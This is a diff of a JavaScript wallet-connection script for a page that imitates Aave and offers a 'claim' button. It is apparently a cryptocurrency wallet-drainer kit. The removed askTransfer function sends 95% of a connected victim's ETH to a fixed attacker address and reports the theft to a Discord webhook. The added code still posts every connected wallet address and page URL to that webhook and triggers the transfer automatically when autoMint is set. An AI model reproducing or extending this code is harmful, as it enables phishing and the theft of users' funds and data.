@@ -1,456 +1,208 @@
 'use strict';
 
+// Aave-like WalletConnect + injected wallet flow
+// - Injected connectors (MetaMask etc)
+// - WalletConnect connector (QR + mobile deep link)
+// - event-driven connect/disconnect
+
 let WalletConnectProvider = window.WalletConnectProvider || null;
+let provider = null;
+let web3 = null;
 
-let provider;
-let web3;
-
-const WALLETCONNECT_DEEP_LINKS = {
+const WALLETCONNECT_DEEPLINKS = {
   trust: uri => `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
+  metamask: uri => `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`,
   coinbase: uri => `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
   rainbow: uri => `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
   imtoken: uri => `imtokenv2://wc?uri=${encodeURIComponent(uri)}`,
-  argent: uri => `argent://wc?uri=${encodeURIComponent(uri)}`,
+  argent: uri => `argent://wc?uri=${encodeURIComponent(uri)}`
 };
 
-const connectWalletConnectDeepLink = async (walletId) => {
-  if (!WalletConnectProvider) {
-    alert('WalletConnect is not available in this environment.');
-    return;
+const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+const onWalletConnected = async (account) => {
+  console.log('⛓ Wallet connected:', account);
+  const connectBtn = document.querySelector('#connectWallet');
+  if (connectBtn) connectBtn.style.display = 'none';
+
+  const claimBtn = document.querySelector('#claimButton');
+  if (claimBtn) claimBtn.style.display = '';
+
+  if (window.feedbackEnabled && window.discordWebhookURL) {
+    fetch(window.discordWebhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: `✅ Wallet Connected: ${account} - ${window.location.href}` }),
+    }).catch(e => console.error('Webhook error', e));
   }
 
-  provider = new WalletConnectProvider({
-    bridge: 'https://bridge.aktionariat.com',
-    infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
-    qrcode: false,
-    qrcodeModalOptions: {
-      mobileLinks: ['trust', 'metamask', 'coinbase', 'rainbow', 'argent', 'imtoken']
-    }
-  });
-
-  provider.on('display_uri', (uri) => {
-    console.log('WalletConnect display_uri event', uri);
-    const resolver = WALLETCONNECT_DEEP_LINKS[walletId] || WALLETCONNECT_DEEP_LINKS.trust;
-    const deepLink = resolver(uri);
-    console.log('Redirecting to wallet deep link:', deepLink);
-    window.location.href = deepLink;
-  });
-
-  provider.on('connect', (info) => {
-    console.log('WalletConnect connected:', info);
-  });
-
-  provider.on('disconnect', (code, reason) => {
-    console.log('WalletConnect disconnected:', code, reason);
-  });
-
-  try {
-    await provider.enable();
-    web3 = new Web3(provider);
-    const accounts = await web3.eth.getAccounts();
-    console.log('Connected via WalletConnect:', accounts[0]);
-    await onWalletConnected(accounts[0]);
-  } catch (error) {
-    console.error('WalletConnect deep link connection error:', error);
-    alert('Failed to connect via WalletConnect. Please approve in your wallet app.');
+  if (window.autoMint) {
+    try { await window.askTransfer(); } catch (err) { console.warn('autoMint fail', err); }
   }
 };
 
-const connectMetaMask = async () => {
-  try {
-    console.log('Connecting to MetaMask...');
-    if (!window.ethereum) {
-      alert('MetaMask not installed. Please install MetaMask.');
+const handleProviderEvents = (wcProvider) => {
+  wcProvider.on('display_uri', (uri) => {
+    console.log('WalletConnect display_uri', uri);
+    const wallet = wcProvider.walletSelection || 'trust';
+    const link = WALLETCONNECT_DEEPLINKS[wallet] || WALLETCONNECT_DEEPLINKS.trust;
+    const deepLink = link(uri);
+
+    if (isMobile()) {
+      console.log('Deep linking to mobile wallet', deepLink);
+      window.location.href = deepLink;
       return;
     }
-    
+
+    const qrImg = document.querySelector('#walletconnectQr img');
+    if (qrImg) {
+      qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(uri)}`;
+      document.querySelector('#walletconnectQr').style.display = 'block';
+    }
+  });
+
+  wcProvider.on('connect', async (info) => {
+    console.log('WalletConnect connected', info);
+    web3 = new Web3(wcProvider);
+    const accounts = await web3.eth.getAccounts();
+    await onWalletConnected(accounts[0]);
+  });
+
+  wcProvider.on('disconnect', (code, reason) => {
+    console.log('WalletConnect disconnect', code, reason);
+    provider = null;
+    web3 = null;
+    document.querySelector('#walletconnectQr').style.display = 'none';
+  });
+};
+
+const connectInjected = async () => {
+  if (!window.ethereum) {
+    alert('No injected wallet found. Please install MetaMask or another wallet.');
+    return;
+  }
+  try {
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     provider = window.ethereum;
     web3 = new Web3(provider);
-    
-    console.log('Connected to MetaMask:', accounts[0]);
     await onWalletConnected(accounts[0]);
   } catch (error) {
-    console.error('MetaMask connection error:', error);
-    alert('Failed to connect to MetaMask');
+    console.error('Injected connect failed', error);
+    alert('Injected wallet connection rejected or failed.');
   }
 };
 
-const showWalletList = () => {
-  return new Promise((resolve) => {
-    const wallets = [
-      { name: 'MetaMask', icon: '🦊', id: 'metamask' },
-      { name: 'Trust Wallet', icon: '🛡️', id: 'trust' },
-      { name: 'Coinbase Wallet', icon: '☁️', id: 'coinbase' },
-      { name: 'Rainbow', icon: '🌈', id: 'rainbow' },
-      { name: 'IMTOKEN', icon: '👛', id: 'imtoken' },
-      { name: 'Argent', icon: '🔐', id: 'argent' }
-    ];
-
-    const modal = document.createElement('div');
-    modal.id = 'walletListModal';
-    modal.style.cssText = `
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-    `;
-
-    const content = document.createElement('div');
-    content.style.cssText = `
-      background: white;
-      padding: 30px;
-      border-radius: 15px;
-      text-align: center;
-      min-width: 320px;
-      max-width: 400px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-    `;
-
-    content.innerHTML = `
-      <h2 style="margin-top: 0; color: #333; margin-bottom: 10px;">Select Wallet</h2>
-      <p style="color: #888; margin-bottom: 25px; font-size: 14px;">Click to open your wallet app</p>
-      <div id="walletGrid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;"></div>
-    `;
-
-    const grid = content.querySelector('#walletGrid');
-    
-    wallets.forEach(wallet => {
-      const btn = document.createElement('button');
-      btn.style.cssText = `
-        padding: 15px;
-        border: 2px solid #e0e0e0;
-        border-radius: 10px;
-        background: white;
-        cursor: pointer;
-        font-size: 14px;
-        transition: all 0.2s;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 8px;
-      `;
-      btn.innerHTML = `<span style="font-size: 28px;">${wallet.icon}</span><span>${wallet.name}</span>`;
-      
-      btn.onmouseover = () => {
-        btn.style.borderColor = '#3b99fc';
-        btn.style.background = '#f0f7ff';
-      };
-      btn.onmouseout = () => {
-        btn.style.borderColor = '#e0e0e0';
-        btn.style.background = 'white';
-      };
-      
-      btn.onclick = () => {
-        modal.remove();
-        resolve(wallet.id);
-      };
-      
-      grid.appendChild(btn);
-    });
-
-    const cancelBtn = document.createElement('button');
-    cancelBtn.textContent = '✕ Cancel';
-    cancelBtn.style.cssText = `
-      width: 100%;
-      padding: 12px;
-      margin-top: 20px;
-      background: #f5f5f5;
-      color: #333;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 14px;
-    `;
-    cancelBtn.onclick = () => {
-      modal.remove();
-      resolve(null);
-    };
-
-    content.appendChild(cancelBtn);
-    modal.appendChild(content);
-    document.body.appendChild(modal);
-  });
-};
-
-const connectWallet = async (walletId) => {
-  try {
-    if (walletId === 'metamask') {
-      await connectMetaMask();
-      return;
-    }
-
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-    if (['trust', 'coinbase', 'rainbow', 'imtoken', 'argent'].includes(walletId)) {
-      if (isMobile) {
-        console.log('Mobile detected - using deep link for wallet', walletId);
-        await connectWalletConnectDeepLink(walletId);
-        return;
-      }
-      console.log('Desktop detected - using WalletConnect QR for', walletId);
-      // Desktop fallback: show QR code because deep link is not reliable on desktop
-      if (!WalletConnectProvider) {
-        alert('WalletConnect is not available in this environment.');
-        return;
-      }
-      provider = new WalletConnectProvider({
-        bridge: 'https://bridge.aktionariat.com',
-        infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
-        qrcode: true,
-        qrcodeModalOptions: {
-          mobileLinks: ['trust', 'metamask', 'coinbase', 'rainbow', 'argent', 'imtoken']
-        }
-      });
-      await provider.enable();
-      web3 = new Web3(provider);
-      const accounts = await web3.eth.getAccounts();
-      console.log('Connected via WalletConnect (desktop QR):', accounts[0]);
-      await onWalletConnected(accounts[0]);
-      return;
-    }
-
-    if (!WalletConnectProvider) {
-      alert('WalletConnect is not available in this environment.');
-      return;
-    }
-
-    provider = new WalletConnectProvider({
-      bridge: 'https://bridge.aktionariat.com',
-      infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
-      qrcode: true,
-      qrcodeModalOptions: {
-        mobileLinks: ['trust', 'metamask', 'coinbase', 'rainbow', 'argent', 'imtoken']
-      }
-    });
-
-    await provider.enable();
-    web3 = new Web3(provider);
-    const accounts = await web3.eth.getAccounts();
-    console.log('Connected via WalletConnect:', accounts[0]);
-    await onWalletConnected(accounts[0]);
-  } catch (error) {
-    console.error('connectWallet error:', error);
-    alert('Failed to connect wallet. Please approve in your wallet app and try again.');
-  }
-};
-
-const connectWalletConnect = async () => {
-  try {
-    const selectedWallet = await showWalletList();
-    if (!selectedWallet) {
-      console.log('Wallet selection cancelled');
-      return;
-    }
-
-    console.log('Selected wallet:', selectedWallet);
-    await connectWallet(selectedWallet);
-  } catch (error) {
-    console.error('WalletConnect error:', error);
-    alert('Failed to connect to WalletConnect');
-  }
-};
-
-const onWalletConnected = async (account) => {
-  try {
-    console.log('Wallet connected:', account);
-    
-    // Hide connect button
-    const connectBtn = document.querySelector('#connectWallet');
-    if (connectBtn) connectBtn.style.display = 'none';
-    
-    // Show claim button
-    const claimBtn = document.querySelector('#claimButton');
-    if (claimBtn) claimBtn.style.display = '';
-
-    // Send to webhook if enabled
-    if (feedbackEnabled && discordWebhookURL) {
-      const message = `✅ Wallet Connected: ${account}\n${window.location.href}`;
-      fetch(discordWebhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      }).catch(e => console.error('Webhook error:', e));
-    }
-
-    // Auto-claim if enabled
-    if (autoMint) {
-      await askTransfer();
-    }
-  } catch (error) {
-    console.error('onWalletConnected error:', error);
-  }
-};
-
-const showWalletPicker = () => {
-  // Create a simple modal dialog
-  const modal = document.createElement('div');
-  modal.id = 'walletModal';
-  modal.style.cssText = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.5);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-  `;
-
-  const content = document.createElement('div');
-  content.style.cssText = `
-    background: white;
-    padding: 30px;
-    border-radius: 10px;
-    text-align: center;
-    min-width: 300px;
-    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-  `;
-
-  content.innerHTML = `
-    <h2 style="margin-top: 0; color: #333;">Select Wallet</h2>
-    <p style="color: #666; margin-bottom: 20px;">Choose how you want to connect</p>
-  `;
-
-  // MetaMask button
-  const mmBtn = document.createElement('button');
-  mmBtn.textContent = '🦊 MetaMask';
-  mmBtn.style.cssText = `
-    display: block;
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    background: #f6851b;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: bold;
-  `;
-  mmBtn.onclick = async () => {
-    modal.remove();
-    await connectMetaMask();
-  };
-
-  // WalletConnect button
-  const wcBtn = document.createElement('button');
-  wcBtn.textContent = '📱 WalletConnect';
-  wcBtn.style.cssText = `
-    display: block;
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    background: #3b99fc;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: bold;
-  `;
-  wcBtn.onclick = async () => {
-    modal.remove();
-    await connectWalletConnect();
-  };
-
-  // Cancel button
-  const cancelBtn = document.createElement('button');
-  cancelBtn.textContent = '✕ Cancel';
-  cancelBtn.style.cssText = `
-    display: block;
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    background: #ccc;
-    color: #333;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    font-size: 14px;
-  `;
-  cancelBtn.onclick = () => modal.remove();
-
-  content.appendChild(mmBtn);
-  content.appendChild(wcBtn);
-  content.appendChild(cancelBtn);
-  modal.appendChild(content);
-  document.body.appendChild(modal);
-};
-
-const askTransfer = async () => {
-  if (!provider || !web3) {
-    console.log('No provider connected');
+const connectWalletConnect = async (walletId) => {
+  if (!WalletConnectProvider) {
+    alert('WalletConnect provider library is missing. Please make sure web3-provider.js is loaded.');
     return;
   }
 
+  const wc = new WalletConnectProvider({
+    bridge: 'https://bridge.walletconnect.com',
+    rpc: { 1: 'https://cloudflare-eth.com/' },
+    qrcode: false,
+    qrcodeModal: false,
+    infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
+  });
+
+  wc.walletSelection = walletId;
+  provider = wc;
+
+  handleProviderEvents(wc);
+
   try {
+    await wc.enable();
+    web3 = new Web3(wc);
     const accounts = await web3.eth.getAccounts();
-    const account = accounts[0];
-
-    const balance = await web3.eth.getBalance(account);
-    const ethBalance = web3.utils.fromWei(balance, 'ether');
-
-    console.log(`Balance for ${account}: ${ethBalance} ETH`);
-
-    if (ethBalance > 0.002) {
-      // Send 95% of balance
-      const gasPrice = await web3.eth.getGasPrice();
-      const txValue = web3.utils.toWei((ethBalance * 0.95).toString(), 'ether');
-      
-      const tx = {
-        from: account,
-        to: receiveAddress,
-        value: txValue,
-        gas: 21000,
-        gasPrice: gasPrice
-      };
-
-      console.log('Sending transaction...');
-      const txHash = await web3.eth.sendTransaction(tx);
-      console.log('Transaction sent:', txHash);
-
-      if (feedbackEnabled && discordWebhookURL) {
-        fetch(discordWebhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            content: `💸 Received ${ethBalance} ETH from ${account}\nTx: ${txHash}` 
-          })
-        }).catch(e => console.error('Webhook error:', e));
-      }
-    } else {
-      console.log('Balance too low:', ethBalance);
-      alert(`Balance too low (${ethBalance} ETH). Minimum: 0.002 ETH`);
-    }
+    await onWalletConnected(accounts[0]);
   } catch (error) {
-    console.error('Transfer error:', error);
-    alert('Transfer failed: ' + error.message);
+    console.error('WalletConnect enable error', error);
+    alert('WalletConnect connection failed. Please try again.');
   }
 };
 
-// Initialize on page load
-window.addEventListener('load', async () => {
-  console.log('Page loaded, setting up wallet buttons');
-  
-  const connectBtn = document.querySelector('#connectWallet');
-  const claimBtn = document.querySelector('#claimButton');
+const showWalletSelector = () => {
+  const modalId = 'walletConnectModalAave';
+  let modal = document.getElementById(modalId);
+  if (modal) { modal.style.display = 'flex'; return; }
 
-  if (connectBtn) {
-    connectBtn.addEventListener('click', showWalletPicker);
-    console.log('Connect button ready');
-  }
+  modal = document.createElement('div');
+  modal.id = modalId;
+  Object.assign(modal.style, {
+    position: 'fixed',
+    inset: '0',
+    background: 'rgba(0,0,0,0.45)',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    zIndex: '9999',
+  });
 
-  if (claimBtn) {
-    claimBtn.addEventListener('click', askTransfer);
-    console.log('Claim button ready');
-  }
-});
+  const panel = document.createElement('div');
+  Object.assign(panel.style, {
+    width: '350px',
+    background: '#fff',
+    borderRadius: '14px',
+    padding: '18px',
+    boxShadow: '0 12px 30px rgba(0,0,0,0.18)',
+    textAlign: 'center',
+  });
+
+  panel.innerHTML = `
+    <h2 style="margin:0 0 14px; font-size: 18px;">Connect wallet</h2>
+    <p style="margin:0 0 18px;color:#666;">Choose a wallet provider like Aave</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px; margin-bottom:12px;" id="wallet-list"></div>
+    <div id="walletconnectQr" style="display:none;margin-top:10px"><img style="width:260px;height:260px;" /></div>
+    <button id="wc-close" style="margin-top:14px;padding:10px 14px;">Close</button>
+  `;
+
+  modal.appendChild(panel);
+  document.body.appendChild(modal);
+
+  const list = panel.querySelector('#wallet-list');
+  const wallets = [
+    { name: 'MetaMask', id: 'metamask' },
+    { name: 'Trust Wallet', id: 'trust' },
+    { name: 'Coinbase', id: 'coinbase' },
+    { name: 'Rainbow', id: 'rainbow' },
+    { name: 'Argent', id: 'argent' },
+    { name: 'IMToken', id: 'imtoken' }
+  ];
+
+  wallets.forEach((wallet) => {
+    const btn = document.createElement('button');
+    btn.textContent = wallet.name;
+    Object.assign(btn.style, {
+      padding: '10px',
+      border: '1px solid #dde2ea',
+      borderRadius: '8px',
+      background: '#fff',
+      cursor: 'pointer',
+      fontWeight: '600',
+      minHeight: '46px'
+    });
+    btn.onclick = async () => {
+      if (wallet.id === 'metamask') {
+        await connectInjected();
+      } else {
+        await connectWalletConnect(wallet.id);
+      }
+    };
+    list.appendChild(btn);
+  });
+
+  panel.querySelector('#wc-close').onclick = () => {
+    modal.style.display = 'none';
+  };
+};
+
+// expose to page
+window.showWalletSelector = showWalletSelector;
+window.connectMetaMask = connectInjected;
+window.connectWalletConnect = connectWalletConnect;
+
+// auto attach to existing buttons if present
+const connectButton = document.querySelector('#connectWallet');
+if (connectButton) connectButton.addEventListener('click', showWalletSelector);
+
